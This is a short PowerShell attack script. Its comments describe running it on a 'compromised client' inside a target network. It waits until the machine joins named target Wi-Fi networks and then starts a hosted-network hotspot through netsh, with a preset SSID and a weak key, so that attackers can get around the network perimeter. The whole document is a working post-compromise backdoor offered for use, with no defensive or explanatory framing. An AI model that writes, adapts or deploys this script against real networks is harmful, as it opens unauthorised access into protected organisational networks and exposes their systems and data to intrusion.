<# This script has the pre-requisite requirement that the victim host supports hosted networks, aka netsh wlan show drivers... "Hosted network supported  : Yes" #>
<# Then please declare the hosted network before executing this script netsh wlan set hostednetwork mode=allow ssid=Hellothere key=password123 #>
<# Its behavior will enable a hotspot from within the target network on the compromised client, allowing a perimeter bypass #>

$desiredNetworks = @("targetSSID1", "targetSSID2")
$executablePath = "netsh"
$process = $null

while ($true) {
    $connectedNetwork = Get-NetConnectionProfile | Where-Object { $_.InterfaceAlias -like "*Wi-Fi*" }

    if ($connectedNetwork -and $desiredNetworks -contains $connectedNetwork.Name) {
        if (-not $process) {
            $process = Start-Process -FilePath $executablePath -ArgumentList "wlan start hostednetwork" -NoNewWindow -PassThru
        }
    }
    else {
        if ($process) {
            $process | Stop-Process -Force
            $process = $null
        }
    }

    Start-Sleep -Seconds 10
}
